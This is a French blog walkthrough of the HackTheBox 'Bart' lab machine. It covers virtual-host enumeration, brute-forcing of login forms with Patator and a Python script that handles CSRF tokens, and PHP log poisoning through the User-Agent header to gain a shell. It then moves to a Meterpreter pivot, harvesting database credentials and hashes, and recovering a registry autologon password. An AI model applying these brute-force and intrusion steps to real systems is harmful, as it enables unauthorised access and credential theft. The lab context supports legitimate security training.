# Solution du CTF Bart de HackTheBox

*Bart* aura été l'un des challenges les plus fun que j'ai résolu sur [HackTheBox](https://www.hackthebox.eu/) avec une longue étape initiale dédiée à l'énumération, suivi d'exploitation web puis enfin la recherche d'une escalade de privilèges Windows.  

La taille de l'article devrait alors être conséquente :) C'est parti !  

I will always enumerate first
-----------------------------

Quand on pointe notre browser sur 10.10.10.81 on est redirigé vers *forum.bart.htb*. Un ajout de ligne dans le */etc/hosts* plus tard on découvre un *Wordpress* sur cette adresse.  

Le site est quasi vide, d'ailleurs la plupart des liens n'amènent nul part. On note une mention *Theme: Sydney by aThemes | Adapted and modified by BART.* mais on ne retrouve pas d'exploit connu pour le thème mentionné.  

Par acquis de conscience je note les différents noms et adresses mentionnées dans la page :  

```plain
Address 77 W Houston St New York, NY 10012, USA
Phone +99 555 999
Mail info@bart.htb

s.brown@bart.local
Samantha Brown
CEO@BART

d.simmons@bart.htb
Daniel Simmons
Head of Sales

r.hilton@bart.htb
Robert Hilton
Head of IT

// commenté dans le code
Harvey Potter
Developer@BART
h.potter@bart.htb
```

Ça nous fait des noms d'utilisateurs potentiels pour un éventuel brute-force plus tard. Je ne posterais pas le résultat de WPScan puisque la piste d'une éventuelle vulnérabilité sur ce blog n'a mené nul part...  

Dès lors j'ai choisi d'énumérer les possibles sous-domaines de *bart.htb*. Ici on ne peut pas avoir recours à un outil classique de brute-force de sous-domaines car il n'y a pas de serveur DNS pour nous indiquer les sous-domaines valides.  

La technique employée sera en réalité un brute-force du header HTTP Host et l'observation des réponses pour déterminer l'existence d'un site à cette adresse. En l'occurrence on a vu que le comportement par défaut si on ne spécifie pas de nom d'hôte est de nous rediriger via un statut 302 vers *forum.bart.htb*. Il en va de même avec un host invalide (*curl -D- -H "Host: invalid.bart.htb" http://10.10.10.81/*).  

Quand il s'agit de brute-force sur HTTP, [Patator](https://github.com/lanjelot/patator) est selon moi l'outil le mieux pensé. Il y a certes pas mal d'options à passer mais c'est le prix pour sa flexibilité :)  

```plain
devloop@kali:~$ patator http_fuzz url=http://10.10.10.81/ method=GET header="Host: FILE0.bart.htb" -x ignore:code=302 0=/usr/share/sublist3r/subbrute/names.txt
11:35:16 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-05-26 11:35 CEST
11:35:16 patator    INFO -                                                                              
11:35:16 patator    INFO - code size:clen       time | candidate                          |   num | mesg
11:35:16 patator    INFO - -----------------------------------------------------------------------------
11:35:17 patator    INFO - 200  35756:35529    0.479 | forum                              |    32 | HTTP/1.1 200 OK
11:35:19 patator    INFO - 200  3807:3423      1.683 | monitor                            |   213 | HTTP/1.1 200 OK
11:37:27 patator    INFO - 400  513:334        0.028 | *                                  | 37212 | HTTP/1.1 400 Bad Request
11:42:50 patator    INFO - 400  513:334        0.028 | _snmp                                 | 129119 | HTTP/1.1 400 Bad Request
11:42:51 patator    INFO - 400  513:334        0.032 |                                    | 129327 | HTTP/1.1 400 Bad Request
11:42:52 patator    INFO - Hits/Done/Skip/Fail/Size: 5/129408/0/0/129408, Avg: 283 r/s, Time: 0h 7m 36s
```

Ici deux sous-domaines valides ont été trouvés. Les 400 sont le résultats de noms d'hôtes invalides.  

Le nouveau domaine nous amène sur une installation de [PHP Server Monitor](http://www.phpservermonitor.org/). En cherchant sur exploit-db et cve-details on ne trouve rien de bien sexy (CSRF, XSS) pourtant on remarque vite une faille : en utilisant la fonctionnalité d'oubli de mot de passe, le logiciel est assez verbeux quand à l'existence d'un utilisateur.  

Ainsi on a l'erreur suivante lorsque l'on saisit par exemple *test* :  

![PHP Server Monitor username enumeration](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/bart_phpservermonitor_forgot.png)

Alors que si l'on rentre *daniel* ou *harvey* que l'on a noté plus tôt on obtient le message *An email has been sent to you with information how to reset your password.*  

So let's go brute-force ! On prépare une liste de mots de passe éventuels (à partir des infos récupérées + mots de passe courants) et on s'attaque à l'utilisateur *harvey*.  

La difficulté ici est la présence d'un token anti-CSRF sur le formulaire de login. Cela n'est pas une difficulté pour Patator du moment qu'on lui donne les bonnes options :  

```plain
devloop@kali:~$ patator http_fuzz url=http://monitor.bart.htb/index.php method=POST body="csrf=__CSRF__&user_name=harvey&user_password=FILE0" accept_cookie=1 before_urls=http://monitor.bart.htb/index.php before_egrep='__CSRF__:name="csrf" value="([0-9a-f]+)"' 0=passwords.txt -x ignore:fgrep='The information is incorrect'
14:00:35 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-05-26 14:00 CEST
14:00:35 patator    INFO -                                                                              
14:00:35 patator    INFO - code size:clen       time | candidate                          |   num | mesg
14:00:35 patator    INFO - -----------------------------------------------------------------------------
14:00:39 patator    INFO - 302  4218:0         1.566 | potter                             |     3 | HTTP/1.1 302 Found
14:00:39 patator    INFO - Hits/Done/Skip/Fail/Size: 1/5/0/0/5, Avg: 1 r/s, Time: 0h 0m 3s
```

On peut aussi bien sûr utiliser notre propre outil de force brute avec le trio magique requests / BeautifulSoup / re :  

```python
import re
import sys

import requests
from bs4 import BeautifulSoup

CSRF_REGEX = re.compile("[a-f0-9]{64}")

username = sys.argv[1]
wordlist = sys.argv[2]

sess = requests.session()
r = sess.get("http://monitor.bart.htb/index.php")
soup = BeautifulSoup(r.text, "html5lib")
csrf_token = CSRF_REGEX.search(r.text).group()

with open(wordlist) as fd:
    for line in fd:
        password = line.strip()

        r = sess.post(
                "http://monitor.bart.htb/index.php",
                data={
                    "user_name": username,
                    "user_password": password,
                    "action": "login",
                    "csrf": csrf_token
                },
                headers={"referer": "http://monitor.bart.htb/index.php"}
        )

        if "The information is incorrect." not in r.text:
            print("Found password {} for user {}".format(password, username))
            break

        csrf_token = CSRF_REGEX.search(r.text).group()
```

Cet accès nous permet de voir un nouveau hostname parmi les serveurs monitorés : internal-01.bart.htb  

![HackTheBox Bart reference to internal-01.bart.htb](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/bart_internal_chat_reference.png)

Un formulaire de login pour une appli de chat vraisemblablement home-made nous incite une fois encore à trouver un mot de passe pour ce cher *Harvey*. De quoi relancer *Patator* :  

```plain
devloop@kali:~$ patator http_fuzz url=http://internal-01.bart.htb/simple_chat/login.php method=POST body="uname=harvey&passwd=FILE0&submit=Login" follow=1 accept_cookie=1 0=passwords.txt -x ignore:fgrep='Invalid Username or Password' -x ignore:fgrep='The Password must be at least 8 characters'
14:44:21 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-05-26 14:44 CEST
14:44:21 patator    INFO -                                                                              
14:44:21 patator    INFO - code size:clen       time | candidate                          |   num | mesg
14:44:21 patator    INFO - -----------------------------------------------------------------------------
14:44:22 patator    INFO - 200  3370:2735      1.082 | Password1                          |     5 | HTTP/1.1 200 OK
14:44:22 patator    INFO - Hits/Done/Skip/Fail/Size: 1/6/0/0/6, Avg: 4 r/s, Time: 0h 0m 1s
```

Highway to shell
----------------

Cette application de chat est très sommaire toutefois en regardant le code source on devine une situation de write-what-where dans le mécanisme de logging présent :  

![HackTheBox Bart XHR request to log chats](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/bart_internal_chat_xhr.png)

On peut s'en assurer avec cette erreur verbose lorsque l'on spécifie le *boot.ini* comme fichier de log :  

```plain
Warning: file_put_contents(../../../../../../../boot.ini): failed to open stream: Permission denied in C:\inetpub\wwwroot\internal-01\log\log.php on line 41
```

On a effectivement le write-where mais quand est-il du what ? Si on logue dans un nouveau fichier (*log.php?filename=abcd.txt&username=harvey*) et qu'on le consulte ensuite on trouve un contenu comme celui-çi :  

```plain
[2018-04-26 17:28:02] - harvey - Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
[2018-04-26 17:28:05] - harvey - Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
```

Après vérification, et comme on pouvait s'en douter, le User-Agent n'est pas proprement échappé avant d'être écrit dans les logs, ce qui permet ainsi d'écrire une backdoor PHP minimaliste dans un fichier PHP sous l'arborescence web.  

J'ai aussi upoadé un *phpinfo()*, toujours pratique pour obtenir des infos sur le système (Windows 10, AMD64, pas de sécurisation particulière de PHP, Powershell présent).  

Avec l'exécution de commande PHP on peut *muter* vers un *Meterpreter*. Les sessions ont la vie dure sur ce CTF et il aura fallu que je change le processus par défaut utilisé par le module *payload\_inject* de Metasploit pour être un peu tranquille (sans doute un participant qui s'amusait à faire un taskkill sur les *notepad.exe*).  

Dans notre *Meterpreter* on s’aperçoit que l'on est *NT AUTHORITY\IUSR*... autant dire que ce n'est pas la joie.  

On trouve 3 utilisateurs sur le système :  

```plain
C:\inetpub\wwwroot\internal-01\log>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            b.hilton                 d.simmons                
DefaultAccount           Guest                    h.potter                 
privileged               
The command completed with one or more errors.
```

Il semble toutefois qu'ils n'aient pas tous leur dossier personnel :  

```plain
 Directory of C:\Users

04/10/2017  09:13    <DIR>          .
04/10/2017  09:13    <DIR>          ..
04/02/2018  22:58    <DIR>          Administrator
02/10/2017  13:08    <DIR>          DefaultAppPool
04/10/2017  08:40    <DIR>          forum.bart.local
21/02/2018  22:39    <DIR>          h.potter
24/09/2017  21:55    <DIR>          Harvey Potter
04/02/2018  22:56    <DIR>          internal.bart.local
04/10/2017  08:42    <DIR>          monitor.bart.local
06/02/2018  11:15    <DIR>          privileged
21/02/2018  22:45    <DIR>          Public
02/10/2017  13:08    <DIR>          test
```

Traversée du désert
-------------------

Je suis alors parti à la recherche d'identifiants éventuels dans les fichiers PHP. par exemple dans *C:\inetpub\wwwroot\internal-01\simple\_chat\includes\dbconnect.php* :  

```php
$con = @mysqli_connect('localhost', 'harvey', '!IC4nB3Th3B3st?', 'internal_chat');
```

ou encore dans *C:\inetpub\wwwroot\monitor\config.php* :  

```php
define('PSM_DB_HOST', 'localhost');
define('PSM_DB_PORT', '3306');
define('PSM_DB_NAME', 'sysmon');
define('PSM_DB_USER', 'daniel');
define('PSM_DB_PASS', '?St4r1ng1sCr33py?');
define('PSM_DB_PREFIX', '_');
define('PSM_BASE_URL', 'http://monitor.bart.htb');
```

Après la mise en place d'une redirection de ports depuis le Meterpreter :  

```plain
meterpreter > portfwd add -L 127.0.0.1 -l 3306 -p 3306 -r 127.0.0.1
[*] Local TCP relay created: 127.0.0.1:3306 <-> 127.0.0.1:3306
```

J'ai pu me connecter avec les identifiants MySQL pour fouiller d'avantage :  

```plain
MySQL [sysmon]> select * from _config;
+----------------------+------------------------------------------+
| key                  | value                                    |
+----------------------+------------------------------------------+
| language             | en_US                                    |
| proxy                | 0                                        |
| proxy_url            |                                          |
| proxy_user           |                                          |
| proxy_password       |                                          |
| email_status         | 1                                        |
| email_from_email     | monitor@bart.htb                         |
| email_from_name      | Server Monitor                           |
| email_smtp           | 0                                        |
| email_smtp_host      |                                          |
| email_smtp_port      |                                          |
| email_smtp_security  |                                          |
| email_smtp_username  |                                          |
| email_smtp_password  |                                          |
| sms_status           | 0                                        |
| sms_gateway          | mollie                                   |
| sms_gateway_username | username                                 |
| sms_gateway_password | password                                 |
| sms_from             | 1234567890                               |
| pushover_status      | 0                                        |
| pushover_api_token   |                                          |
| password_encrypt_key | 350b1e56356d48c12a70c6787e4db75585a3bbe9 |
| alert_type           | status                                   |
| log_status           | 1                                        |
| log_email            | 1                                        |
| log_sms              | 1                                        |
| log_pushover         | 1                                        |
| log_retention_period | 365                                      |
| version              | 3.2.1                                    |
| version_update_check | 3.2.0                                    |
| auto_refresh_servers | 0                                        |
| show_update          | 1                                        |
| last_update_check    | 1524802739                               |
| cron_running         | 0                                        |
| cron_running_time    | 0                                        |
+----------------------+------------------------------------------+
35 rows in set (0.10 sec)
```

On a l'avantage d'avoir accès au code source de PHP Server Monitor pour vite écarter cette clé de chiffrement [qui n'est que le SHA1 d'un timestamp](https://github.com/phpservermon/phpservermon/blob/0580e756423660caa9ec19b0d2c8edb8e06b4bfd/src/psm/Util/Install/Installer.php#L155).  

Ailleurs on trouve des hashs en Bcrypt :  

```plain
MySQL [sysmon]> select * from _users;
+---------+-----------+--------------------------------------------------------------+------------------------------------------+--------------------------+------------------+-------+----------------+--------+--------------+-----------------+---------------------+
| user_id | user_name | password                                                     | password_reset_hash                      | password_reset_timestamp | rememberme_token | level | name           | mobile | pushover_key | pushover_device | email               |
+---------+-----------+--------------------------------------------------------------+------------------------------------------+--------------------------+------------------+-------+----------------+--------+--------------+-----------------+---------------------+
|       1 | daniel    | $2y$10$uagzza/86ZyHN9D7rCz6duKcYFO2JwKY6vNIrjHzuXUiyhl4gZThS | NULL                                     |                     NULL | NULL             |    10 | Daniel Simmons |        |              |                 | daniel@bart.local   |
|       2 | harvey    | $2y$10$rX2CrXDnE06wOXL7H2Vm2OFSGOEqh5LifQ1Z/qZMmA9aEemoq3p0C | 867d54b7e25ed490d4445d59a48e0bdfd0f9a3b9 |               1524816786 | NULL             |    20 | Harvey Potter  |        |              |                 | h.potter@bart.local |
|       3 | bobby     | $2y$10$dwC0mmzzxBk93jRIhr0Jb.7ksIBnME.Y5R7xOe51yi1fvifHmP3T. | 1dbb316888695d566a3ee8f596d5d5f10bb8c0bb |               1524806540 | NULL             |    10 | Robert Yianni  |        |              |                 | bobby@bart.local    |
+---------+-----------+--------------------------------------------------------------+------------------------------------------+--------------------------+------------------+-------+----------------+--------+--------------+-----------------+---------------------+
3 rows in set (0.09 sec)
```

ou encore en phpass   

```plain
MySQL [forum]> select * from _users;
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email       | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | bobby      | $P$Bf/6il9y3rO0aOeaJUEf7R.l.loWqj/ | bobby         | bobby@bart.local |          | 2017-10-02 13:13:34 |                     |           0 | bobby        |
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.09 sec)
```

La table *internal\_chat.users* semblait plus accessible :  

```plain
MySQL [internal_chat]> select * from user;
+-----+--------+------------------------------------------------------------------+
| uid | uname  | passwd                                                           |
+-----+--------+------------------------------------------------------------------+
|   1 | harvey | faeff13072fffdb78ec3b08427678f18295ee28b8b0befc63eea2135eee85df3 |
|   2 | bobby  | e15929d8ce341f2dfa07ac7a0b6f32379e43868631f2aebc05a3a97b235d6dcc |
|   3 | daniel | f7dbfae1e05efda233b872e9b7f709d3a0f1b042813be01d7e5b9e9788c7c801 |
+-----+--------+------------------------------------------------------------------+
3 rows in set (0.17 sec)
```

On en apprend plus sur ce hash dans *internal-01\simple\_chat\includes\validation\_func.php* :  

```php
	$salt = '8h@tr-waswe_aT#9TaCHuPhU'; //for security reasons please replace this string with your own random string (before attempt to register any user)
	return hash('sha256', $passwd.$salt); //return sha256 hash of the salted password
```

On peut alors stocker les hashs dans un fichier :  

```plain
faeff13072fffdb78ec3b08427678f18295ee28b8b0befc63eea2135eee85df3:8h@tr-waswe_aT#9TaCHuPhU
e15929d8ce341f2dfa07ac7a0b6f32379e43868631f2aebc05a3a97b235d6dcc:8h@tr-waswe_aT#9TaCHuPhU
f7dbfae1e05efda233b872e9b7f709d3a0f1b042813be01d7e5b9e9788c7c801:8h@tr-waswe_aT#9TaCHuPhU
```

Que l'on passera à hashcat (*hashcat --force -m 1410 -a 3 /tmp/hashes.txt /usr/share/ncrack/top50000.pwd*). Malheureusement on n'en tirera que les mots de passe *potter* et *Password1* :')  

Notez que *Password1* semble être le mot de passe Windows de *h.potter* mais ce dernier est expiré (NT\_SATUS\_PASSWORD\_EXPIRED) et je n'ai pas réussi à le changer...  

halfluke les bons tuyaux ;-)
----------------------------

Sans trop d'idées sur la méthode à employer pour élever mes privilèges j'ai demandé conseil à *halfluke* (un autre participant) qui m'a conseillé de jeter un œil au registre.  

Au lieu de passer du temps à fouiller en direct j'ai fait un gros *reg export* de HKLM. Le fichier texte obtenu est en UTF-16 Windows, il est préférable de le convertir en UTF-8 avec iconv avant lecture :)  

On trouve ainsi une entrée intéressante avec un bon vieux grep sur password :  

```plain
"DefaultPassword"="3130438f31186fbaf962f407711faddb"
```

Ce mot de passe est à utiliser tel quel (ce n'est pas un hash). On peut alors utiliser smbclient (après mise en place d'une redirection de port) pour accéder aux deux flags du système :  

```plain
devloop@kali:~$ smbclient -I 127.0.0.1 -U Administrator '//BART/c$'
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\Administrator's password:
Try "help" to get a list of possible commands.
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Sun Feb 11 13:51:05 2018
  ..                                 DR        0  Sun Feb 11 13:51:05 2018
  desktop.ini                       AHS      282  Mon Oct  2 14:08:15 2017
  root.txt                            A       32  Sun Feb 11 13:51:08 2018

        8260095 blocks of size 4096. 3572800 blocks available
smb: \Users\Administrator\Desktop\> get root.txt
getting file \Users\Administrator\Desktop\root.txt of size 32 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

Gigateuf Wayne !

*Published July 15 2018 at 09:32*